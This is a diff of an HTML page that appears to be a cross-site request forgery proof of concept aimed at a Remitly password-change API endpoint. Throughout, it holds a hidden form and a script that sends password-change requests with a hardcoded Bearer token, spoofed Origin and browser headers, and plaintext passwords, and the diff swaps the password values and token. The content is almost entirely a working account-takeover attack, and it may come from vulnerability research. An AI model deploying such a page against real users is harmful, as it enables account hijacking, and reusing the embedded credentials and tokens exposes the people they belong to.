@@ -7,11 +7,11 @@
 </head>
 <body>
 
-    <script>alert("Your Password Changed Successful !!"</script>
+    <p>Hi, Your password changed successfully !</p>
     <form id="csrfForm" action="https://api.remitly.io/v1/auth/change_password" method="POST">
-        <input type="hidden" name="current_password" value="Bob@1234567890">
-        <input type="hidden" name="new_password" value="Bob@1234">
-        <input type="hidden" name="new_password_conf" value="Bob@1234">
+        <input type="hidden" name="current_password" value="Bob@1234">
+        <input type="hidden" name="new_password" value="Bob@1234567890">
+        <input type="hidden" name="new_password_conf" value="Bob@1234567890">
     </form>
 
     <script>
@@ -21,7 +21,7 @@
             xhr.setRequestHeader("X-Remitly-Perf-Reqsize", "800");
             xhr.setRequestHeader("X-Remitly-Perf-Starttime", "1717175043508");
             xhr.setRequestHeader("Accept-Language", "en, en;q=0.5");
-            xhr.setRequestHeader("Authorization", "Bearer y6t0KyTAs3ShaiIQveCudpGFXO90WlyYe7IZWNTWWoN");
+            xhr.setRequestHeader("Authorization", "Bearer ClDxnFY6u2CbadbszpLH3Fz2wLKinsxMsCOYDQKhLrs");
             xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36");
             xhr.setRequestHeader("Accept", "application/json");
             xhr.setRequestHeader("Origin", "https://www.remitly.com");
@@ -38,9 +38,9 @@
             xhr.open(form.method, form.action, true);
             setHeaders(xhr);
             xhr.send(JSON.stringify({
-                "current_password": "Bob@1234567890",
-                "new_password": "Bob@1234",
-                "new_password_conf": "Bob@1234"
+                "current_password": "Bob@1234",
+                "new_password": "Bob@1234567890",
+                "new_password_conf": "Bob@1234567890"
             }));
         });
     </script>
